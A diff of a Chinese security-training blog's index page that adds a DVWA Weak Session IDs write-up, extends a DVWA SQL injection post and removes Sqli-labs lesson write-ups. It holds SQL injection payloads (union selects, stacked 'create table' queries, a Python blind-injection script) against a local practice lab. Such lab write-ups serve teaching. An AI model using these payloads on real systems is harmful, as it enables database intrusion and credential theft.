@@ -445,6 +445,91 @@
 
 
   
+    <article id="post-DVWA 8-Weak Session IDs（弱Session ID）" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/Knlvre.github-io/2019/02/17/DVWA 8-Weak Session IDs（弱Session ID）/">DVWA 8-Weak Session IDs（弱Session ID）</a>
+    </h1>
+  
+
+        
+        <a href="/Knlvre.github-io/2019/02/17/DVWA 8-Weak Session IDs（弱Session ID）/" class="archive-article-date">
+  	<time datetime="2019-02-16T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-02-17</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="源码位置"><a href="#源码位置" class="headerlink" title="源码位置"></a>源码位置</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DVWA\vulnerabilities\weak_id\source\</span><br></pre></td></tr></table></figure>
+<h2 id="页面功能"><a href="#页面功能" class="headerlink" title="页面功能"></a>页面功能</h2><p>点击<code>Generate</code>，向服务器提交当前的<code>dvwaSession</code>值</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/8-1.png" alt="8-1"></p>
+<p>用户访问服务器时，服务器会分配给当前用户一个<code>Session ID</code>，用户将这个Session ID放进<code>Cookie</code>内，服务器就会知道这个用户是谁，就能相应地访问该用户才能访问的内容，无需每次都进行类似输入密码或其他身份验证</p>
+<h2 id="Security-Level-—-Low"><a href="#Security-Level-—-Low" class="headerlink" title="Security Level — Low"></a>Security Level — Low</h2><p>核心代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$html = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">'REQUEST_METHOD'</span>] == <span class="string">"POST"</span>) &#123;</span><br><span class="line">	<span class="keyword">if</span> (!<span class="keyword">isset</span> ($_SESSION[<span class="string">'last_session_id'</span>])) &#123;</span><br><span class="line">		$_SESSION[<span class="string">'last_session_id'</span>] = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	$_SESSION[<span class="string">'last_session_id'</span>]++;</span><br><span class="line">	$cookie_value = $_SESSION[<span class="string">'last_session_id'</span>];</span><br><span class="line">	setcookie(<span class="string">"dvwaSession"</span>, $cookie_value);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="Security-Level-—-Medium"><a href="#Security-Level-—-Medium" class="headerlink" title="Security Level — Medium"></a>Security Level — Medium</h2><p>核心代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$html = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">'REQUEST_METHOD'</span>] == <span class="string">"POST"</span>) &#123;</span><br><span class="line">	$cookie_value = time();</span><br><span class="line">	setcookie(<span class="string">"dvwaSession"</span>, $cookie_value);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="Security-Level-—-High"><a href="#Security-Level-—-High" class="headerlink" title="Security Level — High"></a>Security Level — High</h2><p>核心代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$html = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">'REQUEST_METHOD'</span>] == <span class="string">"POST"</span>) &#123;</span><br><span class="line">	<span class="keyword">if</span> (!<span class="keyword">isset</span> ($_SESSION[<span class="string">'last_session_id_high'</span>])) &#123;</span><br><span class="line">		$_SESSION[<span class="string">'last_session_id_high'</span>] = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	$_SESSION[<span class="string">'last_session_id_high'</span>]++;</span><br><span class="line">	$cookie_value = md5($_SESSION[<span class="string">'last_session_id_high'</span>]);</span><br><span class="line">	setcookie(<span class="string">"dvwaSession"</span>, $cookie_value, time()+<span class="number">3600</span>, <span class="string">"/vulnerabilities/weak_id/"</span>, $_SERVER[<span class="string">'HTTP_HOST'</span>], <span class="keyword">false</span>, <span class="keyword">false</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="Security-Level-—-Impossible"><a href="#Security-Level-—-Impossible" class="headerlink" title="Security Level — Impossible"></a>Security Level — Impossible</h2><p>核心代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$html = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">'REQUEST_METHOD'</span>] == <span class="string">"POST"</span>) &#123;</span><br><span class="line">	$cookie_value = sha1(mt_rand() . time() . <span class="string">"Impossible"</span>);</span><br><span class="line">	setcookie(<span class="string">"dvwaSession"</span>, $cookie_value, time()+<span class="number">3600</span>, <span class="string">"/vulnerabilities/weak_id/"</span>, $_SERVER[<span class="string">'HTTP_HOST'</span>], <span class="keyword">true</span>, <span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">DVWA</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/Knlvre.github-io/2019/02/17/DVWA 8-Weak Session IDs（弱Session ID）/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-DVWA 7-SQL Injection（SQL注入）" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -487,11 +572,21 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-1&apos; union select 1,group_concat(user,password) from users where user_id=1#</span><br><span class="line"></span><br><span class="line">返回：First name: 1；Surname:adminfae0b27c451c728867a567e8c1bb4e53</span><br></pre></td></tr></table></figure>
 <h2 id="Security-Level-—-Medium"><a href="#Security-Level-—-Medium" class="headerlink" title="Security Level — Medium"></a>Security Level — Medium</h2><p>核心代码</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Submit'</span> ] ) ) &#123;</span><br><span class="line">	<span class="comment">// Get input</span></span><br><span class="line">	$id = $_POST[ <span class="string">'id'</span> ];</span><br><span class="line"></span><br><span class="line">	$id = mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>], $id);</span><br><span class="line"></span><br><span class="line">	$query  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = $id;"</span>;</span><br><span class="line">	$result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>], $query) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Get results</span></span><br><span class="line">	<span class="keyword">while</span>( $row = mysqli_fetch_assoc( $result ) ) &#123;</span><br><span class="line">		<span class="comment">// Display values</span></span><br><span class="line">		$first = $row[<span class="string">"first_name"</span>];</span><br><span class="line">		$last  = $row[<span class="string">"last_name"</span>];</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Feedback for end user</span></span><br><span class="line">		$html .= <span class="string">"&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// This is used later on in the index.php page</span></span><br><span class="line"><span class="comment">// Setting it here so we can close the database connection in here like in the rest of the source scripts</span></span><br><span class="line">$query  = <span class="string">"SELECT COUNT(*) FROM users;"</span>;</span><br><span class="line">$result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="keyword">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line">$number_of_rows = mysqli_fetch_row( $result )[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">mysqli_close($GLOBALS[<span class="string">"___mysqli_ston"</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>本难度中，使用了<code>mysqli_real_escape_string()</code>函数对传入的参数进行了处理，受影响的特殊字符有：<code>\x00,\n,\r,\,’,”,\x1a</code>。并且页面中，对参数的输入变成了下拉菜单，希望以此来控制用户的输入</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/7-2.png" alt="7-2"></p>
+<p>但是我们可以通过抓包，来改变传入的参数</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/7-3.png" alt="7-3"></p>
+<p><code>整形注入</code>，其他与前一难度一样了，不再赘述</p>
 <h2 id="Security-Level-—-High"><a href="#Security-Level-—-High" class="headerlink" title="Security Level — High"></a>Security Level — High</h2><p>核心代码</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_SESSION [ <span class="string">'id'</span> ] ) ) &#123;</span><br><span class="line">	<span class="comment">// Get input</span></span><br><span class="line">	$id = $_SESSION[ <span class="string">'id'</span> ];</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Check database</span></span><br><span class="line">	$query  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;"</span>;</span><br><span class="line">	$result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>], $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;Something went wrong.&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Get results</span></span><br><span class="line">	<span class="keyword">while</span>( $row = mysqli_fetch_assoc( $result ) ) &#123;</span><br><span class="line">		<span class="comment">// Get values</span></span><br><span class="line">		$first = $row[<span class="string">"first_name"</span>];</span><br><span class="line">		$last  = $row[<span class="string">"last_name"</span>];</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Feedback for end user</span></span><br><span class="line">		$html .= <span class="string">"&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">"___mysqli_ston"</span>]))) ? <span class="keyword">false</span> : $___mysqli_res);		</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>本难度提交方式又改变了，需要先点击<code>Click here to change your ID.</code>，然后才在弹出的边框中输入参数，源代码中对参数的获取也变成从<code>$_SESSION[]</code>这个全局数组获取</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/7-4.png" alt="7-4"></p>
+<p>与上一关一样，试着抓包修改参数，然后将返回的页面显示在浏览器上，发现返回的只是这个弹出的窗口，并没有有用信息，所以这样做还是有一定的防御作用的。但是这题没必要抓包，直接使用他提供的窗口进行注入就可以</p>
+<p>单引号包裹，其他与前面的一样，不再赘述</p>
 <h2 id="Security-Level-—-Impossible"><a href="#Security-Level-—-Impossible" class="headerlink" title="Security Level — Impossible"></a>Security Level — Impossible</h2><p>核心代码</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Submit'</span> ] ) ) &#123;</span><br><span class="line">	<span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">	checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> );</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Get input</span></span><br><span class="line">	$id = $_GET[ <span class="string">'id'</span> ];</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Was a number entered?</span></span><br><span class="line">	<span class="keyword">if</span>(is_numeric( $id )) &#123;</span><br><span class="line">		<span class="comment">// Check the database</span></span><br><span class="line">		$data = $db-&gt;prepare( <span class="string">'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;'</span> );</span><br><span class="line">		$data-&gt;bindParam( <span class="string">':id'</span>, $id, PDO::PARAM_INT );</span><br><span class="line">		$data-&gt;execute();</span><br><span class="line">		$row = $data-&gt;fetch();</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Make sure only 1 result is returned</span></span><br><span class="line">		<span class="keyword">if</span>( $data-&gt;rowCount() == <span class="number">1</span> ) &#123;</span><br><span class="line">			<span class="comment">// Get values</span></span><br><span class="line">			$first = $row[ <span class="string">'first_name'</span> ];</span><br><span class="line">			$last  = $row[ <span class="string">'last_name'</span> ];</span><br><span class="line"></span><br><span class="line">			<span class="comment">// Feedback for end user</span></span><br><span class="line">			$html .= <span class="string">"&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <p>看了源码之后，发现这里的代码对查询语句的构造和之前的难度不一样了，这里用了<code>PDO</code>的<code>prepare()</code>、<code>bindParam()</code>、<code>execute()</code>三个函数来完成查询语句的构造和执行，关于讲解可以参考这篇文章：<a href="https://www.cnblogs.com/zhouguowei/p/5212994.html" target="_blank" rel="noopener">https://www.cnblogs.com/zhouguowei/p/5212994.html</a></p>
+<p>PDO技术，划清了代码与数据的界限，有效防御SQL注入，同时只有返回的查询结果数量为一时，才会成功输出，这样就有效预防了“脱裤”，Anti-CSRFtoken机制的加入了进一步提高了安全性</p>
 <hr>
 <p>参考文章：</p>
 <p><a href="https://www.freebuf.com/articles/web/120747.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/120747.html</a></p>
@@ -1228,109 +1323,6 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="/Knlvre.github-io/2019/02/10/DVWA 1-Brute Force（暴力破解）/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-Sqli-labs 第51-65关" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/Knlvre.github-io/2019/02/03/Sqli-labs 第51-65关/">Sqli-labs(第51-65关)</a>
-    </h1>
-  
-
-        
-        <a href="/Knlvre.github-io/2019/02/03/Sqli-labs 第51-65关/" class="archive-article-date">
-  	<time datetime="2019-02-02T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-02-03</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>前一部分链接：<a href="https://knlvre.github.io/Knlvre.github-io/2019/02/02/Sqli-labs%20%E7%AC%AC41-50%E5%85%B3/">第41-50关Write-up</a></p>
-<h2 id="Less-51"><a href="#Less-51" class="headerlink" title="Less-51"></a>Less-51</h2><p>与前一关相同，单引号包裹，payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=1&apos;;create table less51 like users--+</span><br></pre></td></tr></table></figure>
-<h2 id="Less-52"><a href="#Less-52" class="headerlink" title="Less-52"></a>Less-52</h2><p>与Less-50相同，只不过没有报错信息回显，payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=1;create table less51 like users--+</span><br></pre></td></tr></table></figure>
-<h2 id="Less-53"><a href="#Less-53" class="headerlink" title="Less-53"></a>Less-53</h2><p>与Less-51相同，只不过没有报错信息回显，payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=1&apos;;create table less51 like users--+</span><br></pre></td></tr></table></figure>
-<h2 id="Less-54"><a href="#Less-54" class="headerlink" title="Less-54"></a>Less-54</h2><p>本关开始，又有了新类型的题目了</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/51-65/4-1.png" alt="4-1"></p>
-<p>题目要求注出<code>secret key</code>，并且提交的次数有十次的限制，本关就先一次一次记录一下：</p>
-<p>①发现单引号包裹</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=2&apos; or 1=1 --+</span><br><span class="line"></span><br><span class="line">回显：Your Login name:Dumb；Your Password:Dumb</span><br></pre></td></tr></table></figure>
-<p>②union联合查询成功</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos; union select 1,2,3 --+</span><br><span class="line"></span><br><span class="line">回显：Your Login name:2;Your Password:3</span><br></pre></td></tr></table></figure>
-<p>③查询表名成功</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+</span><br><span class="line"></span><br><span class="line">回显：Your Login name:2;Your Password:c4ukmmeokq</span><br></pre></td></tr></table></figure>
-<p>④查询列名成功</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&quot;c4ukmmeokq&quot; --+</span><br><span class="line"></span><br><span class="line">回显：Your Login name:2;Your Password:id,sessid,secret_SAT4,tryy</span><br></pre></td></tr></table></figure>
-<p>⑤获取密钥</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos; union select 1,2,secret_SAT4 from c4ukmmeokq --+</span><br><span class="line"></span><br><span class="line">回显：Your Login name:2;Your Password:BlKuhIw2XDbdZWwN6f2W1cTm</span><br></pre></td></tr></table></figure>
-<h2 id="Less-55"><a href="#Less-55" class="headerlink" title="Less-55"></a>Less-55</h2><p>与前一关一样，参数用<code>括号</code>包裹，payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#注表名</span><br><span class="line">?id=-1) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+</span><br><span class="line"></span><br><span class="line">#注列名</span><br><span class="line">?id=-1) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&quot;jzxlk3kxz9&quot; --+</span><br><span class="line"></span><br><span class="line">#注密钥</span><br><span class="line">?id=-1) union select 1,2,secret_NGS3 from jzxlk3kxz9 --+</span><br></pre></td></tr></table></figure>
-<h2 id="Less-56"><a href="#Less-56" class="headerlink" title="Less-56"></a>Less-56</h2><p>与前一关一样，参数用<code>单引号+括号</code>包裹，payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#注表名</span><br><span class="line">?id=-1&apos;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+</span><br><span class="line"></span><br><span class="line">#注列名</span><br><span class="line">?id=-1&apos;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&quot;0p9yfnr8tk&quot; --+</span><br><span class="line"></span><br><span class="line">#注密钥</span><br><span class="line">?id=-1&apos;) union select 1,2,secret_8QJV from 0p9yfnr8tk --+</span><br></pre></td></tr></table></figure>
-<h2 id="Less-57"><a href="#Less-57" class="headerlink" title="Less-57"></a>Less-57</h2><p>与前一关一样，参数用<code>双引号</code>包裹，payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#注表名</span><br><span class="line">?id=-1&quot; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+</span><br><span class="line"></span><br><span class="line">#注列名</span><br><span class="line">?id=-1&quot; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&quot;5w2mz645f4&quot; --+</span><br><span class="line"></span><br><span class="line">#注密钥</span><br><span class="line">?id=-1&quot; union select 1,2,secret_HD9O from 5w2mz645f4 --+</span><br></pre></td></tr></table></figure>
-<h2 id="Less-58"><a href="#Less-58" class="headerlink" title="Less-58"></a>Less-58</h2><p><code>单引号</code>包裹，盲注，python代码只注数据库，不再多谢赘述</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> requests,re</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://127.0.0.1/AAsqli-labs/Less-58/?id=1' and ascii(substr(database(),&#123;&#125;,1))=&#123;&#125; --+"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">95</span>,<span class="number">125</span>):</span><br><span class="line">        payload = url.format(i,j)</span><br><span class="line">        r = requests.get(payload)</span><br><span class="line">        soup = BeautifulSoup(r.text,<span class="string">'lxml'</span>)</span><br><span class="line">        match = re.findall(<span class="string">"Angelina"</span>,str(soup))</span><br><span class="line">        <span class="keyword">if</span>(match):</span><br><span class="line">            flag = flag + chr(j)</span><br><span class="line">            print(flag)</span><br></pre></td></tr></table></figure>
-<h2 id="Less-59"><a href="#Less-59" class="headerlink" title="Less-59"></a>Less-59</h2><p>与前一关差不多，只不过没有参数没有包裹，<code>整形注入</code></p>
-<h2 id="Less-60-65"><a href="#Less-60-65" class="headerlink" title="Less-60-65"></a>Less-60-65</h2><p>类型都差不多，就不再详细讲解了</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">Sqli-labs</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/Knlvre.github-io/2019/02/03/Sqli-labs 第51-65关/">展开全文 >></a>
         </p>
       
 
